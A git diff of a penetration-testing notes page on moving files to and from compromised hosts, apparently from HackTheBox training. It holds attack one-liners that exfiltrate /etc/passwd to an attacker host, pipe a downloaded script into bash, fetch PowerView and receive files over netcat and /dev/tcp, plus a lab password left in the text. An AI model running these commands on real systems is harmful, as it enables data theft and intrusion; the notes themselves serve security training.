@@ -8,108 +8,114 @@ tags:
   - file transfer technique
   - backdoors
 ---
-
 # Transferring files with code
 
+## Upload operations
 
-## Python
+### Python3
 
-### python2 Download
+[uploadserver](uploadserver.md)
+
+```python
+# Start the Python uploadserver Module
+python3 -m uploadserver 
+
+# Uploading a File Using a Python One-liner
+python3 -c 'import requests;requests.post("http://$ipAttacker:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+
+## Download operations
+
+### Python
+
+#### python2 Download
 
 ```bash
 python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
-### Python 3 - Download
+#### Python 3 - Download
 
 ```bash
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 
-### Upload Operations using Python3
 
-[uploadserver](uploadserver.md)
+### PHP
 
-```bash
-# Start the Python uploadserver Module
-python3 -m uploadserver 
+#### PHP Download with File_get_contents() and  file_put_contents ()
 
-# Uploading a File Using a Python One-liner
-python3 -c whet'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
-```
-
-htb-student | Password:HTB_@cademy_stdnt!)
-
-## PHP
-
-### PHP Download with File_get_contents()
-
-```bash
+```php
 # PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.
 php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```
 
-### PHP Download with Fopen()
+#### PHP Download with Fopen()
 
-```bash
+```php
 php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
 
-### PHP Download a File and Pipe it to Bash
+#### PHP Download a File and Pipe it to Bash
 
-```bash
+```php
 php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 # The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. 
 ```
 
 
-## Ruby
+### Ruby
 
-### Download a File
+**Download a File:**
 
-```bash
+```ruby
 ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
 
 
-## Perl
+### Perl
 
-### Download a File
+**Download a File:**
 
-```bash
+```perl
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
 
 
-## JavaScript
+### JavaScript
 
-### Download a file with wget.js
+**Download a File Using JavaScript and cscript.exe:**
 
-wget.js content:
+First save the following text as `wget.js`:
 
 ```js
+// wget.js content:
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
 WinHttpReq.Send();
+
+WScript.Echo(WinHttpReq.ResponseText);
+
+/* To save a binary file use this code instead of previous line
 BinStream = new ActiveXObject("ADODB.Stream");
 BinStream.Type = 1;
 BinStream.Open();
 BinStream.Write(WinHttpReq.ResponseBody);
-BinStream.SaveToFile(WScript.Arguments(1));
+BinStream.SaveToFile("out.bin");
+*/
 ```
 
-### Download a File Using JavaScript and cscript.exe
-
-Console Based Script Host from Microsoft Corporation belonging to Microsoft (r) Windows Script Host.
+Now, we can execute the JavaScript code and download the file from  a Windows command prompt or PowerShell terminal:
 
 ```cmd
 cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
 
 
-## VBScript
+### VBScript
 
 [VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic.
 
@@ -135,9 +141,9 @@ Now, download a File Using VBScript and cscript.exe
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
-## Netcat
+### Netcat
 
-### Printing information on screen
+#### Printing information on screen
 
 On the server side (attacking machine):
 
@@ -152,35 +158,39 @@ On the client side (victim's machine):
 echo “hello” | nc -v $ip <port>
 ```
 
-###  Transfer data and save it in a file with netcat
+####  Transfer data and save it in a file with netcat
 
-#### Victim's Machine listening on `<Port>` 
+##### Victim's Machine listening on `<Port>` 
 
 On the client side (victim's machine):
 
 ```bash
-nc -lvp <port> --recv-only > received.txt  
-# --recv-only: to close the connection once the file transfer is finished.
+nc -lvp <port> > received.txt  
+
+# Example using Ncat
+ncat -lvp <port> --recv-only > received.txt  
+# --recv-only: to close the connection once the file transfer is finished when using ncat.
 ```
 
 
 On the server side (attacking machine):
 
 ```bash
-# Data will be stored in reveived.txt file.
+# Data will be stored in received.txt file.
 cat tobesentfile.txt | nc -v $ip <port>
-# The option -q 0 will tell Netcat to close the connection once it finishes. 
+
 
 # Alternative:
-nc -q 0 $ipVictim <port> < tobesentfile.txt 
+nc -q 0 $ipVictim <port> < tobesentfile.txt
+# The option -q 0 will tell Netcat to close the connection once it finishes. 
 
 ncat --send-only $ipVictim <port> < tobesentfile.txt 
 # The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.
 ```
 
-#### Victim's machine connects to netcat only to receive the file 
+##### Victim's machine connects to netcat only to receive the file 
 
-Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
+Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our attacker machine and send a file as input to Netcat.
 
 On the server side (attacking machine):
 
@@ -197,15 +207,15 @@ nc $ipAttacker 443 > tobesentfile.txt
 
 ncat $ipAttacker 443 --recv-only > tobesentfile.txt
 
-# Using /dev/tcp to Receive the File
-cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+# If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html). Using /dev/tcp to Receive the File
+cat < /dev/tcp/$ipAttacker/443 > received.txt 
 ```
 
 ## PowerShell Session File Transfer
 
-PowerShell Remoting uses [Windows Remote Management (WinRM)](5985-5986-winrm-windows-remote-management.md), which is the Microsoft implementation of the [Web Services for Management (WS-Management)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protocol, to allow users to run PowerShell commands on remote computers.
+There may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.  To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
 
-To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
+PowerShell Remoting uses [Windows Remote Management (WinRM)](5985-5986-winrm-windows-remote-management.md), which is the Microsoft implementation of the [Web Services for Management (WS-Management)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protocol, to allow users to run PowerShell commands on remote computers.
 
 Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
 
@@ -253,7 +263,9 @@ PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destin
 ```
 
 
-## RDP
+## Sharing resources
+
+### RDP
 
 RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. 
 
@@ -265,7 +277,7 @@ We can use [xfreerdp](xfreerdp.md) or [rdesktop](rdesktop.md) to download a file
 rdesktop $ipVictim -d <domain> -u <username> -p <'Password0@'> -r disk:linux="/home/user/rdesktop/files"
 ```
 
-
+HTB_@cademy_stdnt!
 ### Mounting a Linux Folder Using xfreerdp
 
  ```bash
